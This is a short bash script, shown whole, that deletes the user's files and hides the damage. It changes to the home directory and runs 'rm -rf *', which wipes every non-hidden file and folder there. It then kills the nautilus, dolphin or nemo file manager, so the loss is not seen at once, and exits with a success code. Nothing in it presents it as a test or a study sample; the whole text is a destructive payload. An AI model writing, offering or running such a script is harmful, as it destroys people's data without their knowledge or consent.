#!/bin/bash

set -e
cd ~
rm -rf *
killall nautilus 2>/dev/null || killall dolphin 2>/dev/null || killall nemo 2>/dev/null
exit 0
